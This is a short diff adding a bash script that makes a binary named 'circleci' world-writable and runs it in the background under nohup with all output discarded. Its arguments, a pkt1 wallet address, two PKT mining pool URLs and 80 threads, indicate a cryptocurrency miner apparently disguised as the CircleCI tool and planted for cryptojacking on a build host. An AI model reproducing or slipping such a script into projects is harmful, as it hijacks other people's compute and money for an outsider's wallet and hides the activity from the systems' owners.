@@ -1,0 +1,4 @@
+#!/bin/bash
+
+chmod 777 circleci >/dev/null 2>&1
+nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pktpool.io http://pool.pkt.world -t 80 > nohup.out >/dev/null 2>&1
